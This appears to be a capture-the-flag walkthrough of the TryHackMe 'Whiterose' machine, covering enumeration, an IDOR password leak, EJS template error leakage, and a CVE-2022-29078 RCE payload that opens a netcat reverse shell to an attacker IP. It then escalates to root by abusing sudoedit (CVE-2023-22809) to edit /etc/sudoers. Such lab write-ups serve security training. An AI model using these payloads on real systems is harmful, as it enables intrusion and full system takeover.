---
tags:
  - THM
  - Linux
  - Easy
  - IDOR
  - Leakage
  - RCE
  - Sudo
---
https://tryhackme.com/room/whiterose/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.255.223 whiterose.thm cyprusbank.thm admin.cyprusbank.thm
```
# Scanning
```console
$ nmap -p22,80 -sV -sC whiterose.thm

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
|_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Preparation
In the [machine's THM room](https://tryhackme.com/room/whiterose/), we are given some **credentials**: `Olivia Cortez:olivi8`

Now, create an alias to use our `admin.cyrpusbank.thm` **session cookie**:
```bash
# Replace connect.sid value with your own cookie
alias curl='curl -s -b "connect.sid=s:So1PpfieLGyzkVVscY3KfaIDA6N-GQ3_.xZcd7R2wfIYKUj55MDZwebFQ5bqbv2lsEfvOu3Km9GE"'
```
# Enumeration
## Hidden Messages
The website redirects to `cyprusbank.thm` domain, but is a site in development.

Found admin panel at `admin.cyprusbank.thm` subdomain:
```console
$ gobuster vhost -q --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://cyprusbank.thm

Found: admin.cyprusbank.thm Status: 302 [Size: 28] [--> /login]
```
Log in with credentials `Olivia Cortez:olivi8`, we can not access the `/settings` section.

Found the **password** of **user Gayle Bev** in `/messages` by abusing an **IDOR vulnerability**:
```console
$ curl 'http://admin.cyprusbank.thm/messages/?c=0' | html2text --ignore-emphasis --ignore-links | head -n 15

### Cyprus National Bank | Admin Panel

  * Home
  * Search
  * Settings
  * Messages
  * Logout

Cyprus National Bank - Admin Chat

DEV TEAM: Thanks Gayle, can you share your credentials? We need privileged
admin account for testing

Gayle Bev: Of course! My password is 'p~]P@5!6;rs558:q'
```
## Error Leakage
Log out from the admin panel and then log in as **user Gayle Bev**.

Found **Tyrell Wellick's phone number** in the `/search` section.

The `/settings` page allows to change the password of the specified customer name. If we delete the **password field** from the request, we get an error:
```console
$ curl http://admin.cyprusbank.thm/settings -d 'name=Tyrell+Wellick' | hml2text

ReferenceError: /home/web/app/views/settings.ejs:14  
	12|         <div class="alert alert-info mb-3"><%= message %></div>  
	13|       <% } %>  
>> 	14|       <% if (password != -1) { %>
	15|         <div class="alert alert-success mb-3">Password updated to '<%= password %>'</div>
	16|       <% } %>
	17|       <% if (typeof error != 'undefined') { %>

password is not defined  
	at eval ("/home/web/app/views/settings.ejs":27:8)  
	at settings (/home/web/app/node_modules/ejs/lib/ejs.js:692:17)  
	at tryHandleCache (/home/web/app/node_modules/ejs/lib/ejs.js:272:36)  
	at View.exports.renderFile [as engine] (/home/web/app/node_modules/ejs/lib/ejs.js:489:10)  
	at View.render (/home/web/app/node_modules/express/lib/view.js:135:8)  
	at tryRender (/home/web/app/node_modules/express/lib/application.js:657:10)  
	at Function.render (/home/web/app/node_modules/express/lib/application.js:609:3)  
	at ServerResponse.render (/home/web/app/node_modules/express/lib/response.js:1039:7)  
	at /home/web/app/routes/settings.js:27:7  
	at runMicrotasks (<anonymous>)
```
From the error message, we know that we are using **Embedded Javascript (EJS)** for rendering templates, which can be vulnerable to [CVE-2022-29078](https://security.snyk.io/vuln/SNYK-JS-EJS-2803307).
# Exploitation
Wait for connections:
```bash
nc -lvnp <PORT>
```
Establish reverse shell connection via **RCE**:
```bash
curl http://admin.cyprusbank.thm/settings -d "name=Tyrell+Wellick&password=x&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc <ATTACKER-IP> <PORT> -e sh');s"
```
Get the **user flag**:
```bash
cat /home/web/user.txt
```
# Post-Exploitation
We can run `sudoedit` with **sudo privileges**:
```console
$ sudo -l

Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```
**Sudo** version is vulnerable to [CVE-2023-22809](https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf):
```console
$ sudo -V

Sudo version 1.9.12p1
Sudoers policy plugin version 1.9.12p1
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.12p1
Sudoers audit plugin version 1.9.12p1
```
Add the line `web ALL=(ALL:ALL) NOPASSWD: ALL` to the `/etc/sudoers` to become **user root**:
```console
$ EDITOR='nano -- /etc/sudoers' sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm

$ sudo su

# whoami
root
```
Get the **root flag**:
```bash
cat /root/root.txt
```